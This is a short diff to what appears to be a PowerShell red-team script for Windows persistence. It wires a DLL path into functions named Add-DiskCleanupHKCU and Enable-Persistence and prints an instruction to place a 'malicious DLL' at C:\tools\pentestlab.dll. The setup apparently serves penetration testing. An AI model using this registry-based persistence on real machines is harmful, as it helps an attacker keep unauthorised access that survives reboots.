@@ -48,6 +48,8 @@ function Add-DiskCleanupHKCU {
 
 [CmdletBinding()] Param (
     [Parameter (ParameterSetName = 'pathToDLL', Mandatory = $True)]
+    $pathToDLL
+
     )
 
 
@@ -63,7 +65,8 @@ function Configure-Persistence {
 }
 
 function Enable-Persistence {
-    Add-DiskCleanupHKCU
+    Add-DiskCleanupHKCU -pathToDLL "C:\tools\pentestlab.dll"
     Add-DiskCleanupHKLM
     Configure-Persistence
+    Write-Host 'Place malicious DLL at C:\tools\pentestlab.dll'
 }
